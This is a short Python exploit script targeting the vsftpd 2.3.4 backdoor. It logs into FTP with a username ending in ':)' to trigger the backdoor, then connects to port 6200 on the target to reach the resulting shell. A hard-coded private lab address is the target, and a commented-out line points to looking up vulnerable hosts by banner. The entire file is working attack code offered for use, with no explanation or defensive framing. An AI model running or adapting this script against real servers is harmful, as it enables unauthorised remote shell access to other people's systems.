#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-04-03 23:49:05
# @Author  : owefsad (1528360120@qq.com)
# @Link    : http://blog.51cto.com/executer
# @Version : $Id$

#from spider import get_sd
from ftplib import FTP
from time import sleep
import threading

def connect_backdoor(ip, port=6200):
	import socket
	s=socket.socket()
	try:
		s.connect((ip, port))
		print(s.recv(1024))
	except Exception as e:
		raise
	else:
		pass
	finally:
		pass

def load_backdoor(ip, port):
	try:
		ftp = FTP(ip)
		ftp.port = port
		ftp.login(user="ftp:)", passwd="pass")
	except Exception as e:
		raise
	else:
		pass
	finally:
		pass


def main():
	theck_ts = []
	#ress=get_sd("vsftpd 2.3.4")
	ress=[("172.16.88.170", 21)]
	for res in ress:
		ts=threading.Thread(target=load_backdoor, args=(res[0], res[1]))
		tc=threading.Thread(target=connect_backdoor, args=(res[0],))
		ts.start()
		sleep(1)
		tc.start()

if __name__ == '__main__':
	main()
